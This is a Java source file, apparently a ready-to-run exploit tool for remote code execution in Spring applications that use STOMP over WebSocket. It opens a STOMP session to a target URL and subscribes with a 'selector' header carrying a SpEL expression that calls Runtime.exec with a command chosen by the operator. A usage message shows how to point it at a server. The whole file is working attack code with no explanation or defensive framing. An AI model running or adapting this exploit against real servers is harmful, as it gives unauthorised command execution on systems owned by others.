package stomp.over.websocket.exp;

import org.springframework.messaging.converter.MappingJackson2MessageConverter;
import org.springframework.messaging.simp.stomp.StompFrameHandler;
import org.springframework.messaging.simp.stomp.StompHeaders;
import org.springframework.messaging.simp.stomp.StompSession;
import org.springframework.messaging.simp.stomp.StompSessionHandler;
import org.springframework.scheduling.concurrent.ConcurrentTaskScheduler;
import org.springframework.util.concurrent.ListenableFuture;
import org.springframework.util.concurrent.ListenableFutureCallback;
import org.springframework.web.socket.client.WebSocketClient;
import org.springframework.web.socket.client.standard.StandardWebSocketClient;
import org.springframework.web.socket.messaging.WebSocketStompClient;

import java.lang.reflect.Type;


public class subscribeEXP {
	
	public static void exploit(String url, String destination, String cmd) {
		try {
			WebSocketClient webSocketClient = new StandardWebSocketClient();
			WebSocketStompClient stompClient = new WebSocketStompClient(webSocketClient);
			stompClient.setMessageConverter(new MappingJackson2MessageConverter());
			stompClient.setTaskScheduler(new ConcurrentTaskScheduler());

			StompSessionHandler sessionHandler = new MyStompSessionHandler();
			ListenableFuture<StompSession> ret = stompClient.connect(url, sessionHandler);
			ret.addCallback(new ListenableFutureCallback<StompSession>() {

				@Override
				public void onSuccess(StompSession session) {
					// TODO Auto-generated method stub
					String expression = String.format("T(java.lang.Runtime).getRuntime().exec('%s')", cmd);
					StompHeaders stompHeaders = new StompHeaders();
					stompHeaders.setDestination(destination);
					stompHeaders.set("selector", expression);
					
					session.subscribe(stompHeaders, new StompFrameHandler() {

						@Override
						public Type getPayloadType(StompHeaders headers) {
							// TODO Auto-generated method stub
							return null;
						}

						@Override
						public void handleFrame(StompHeaders headers, Object payload) {
							// TODO Auto-generated method stub
							
						}});
				}

				@Override
				public void onFailure(Throwable ex) {
					// TODO Auto-generated method stub
					ex.printStackTrace();
				}
			});
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
    public static void main(String[] args) throws Exception {

    	if(args.length != 3) {
    		System.out.println("Usage:\r\n\tjava -jar subscribeEXP.jar <ws_addr> <subapi> <cmd>\r\n"
    				+ "\te.g.\r\n\tjava -jar subscribeEXP.jar ws://127.0.0.1:8080/hello /topic/greetings calc");
    	}
    	else {
        	String url = args[0];
        	String subapi = args[1];
        	String cmd = args[2];
    		exploit(url, subapi, cmd);
    		Thread.sleep(5000);
    		System.out.println("^_^!!!!");
    	}
    }
}
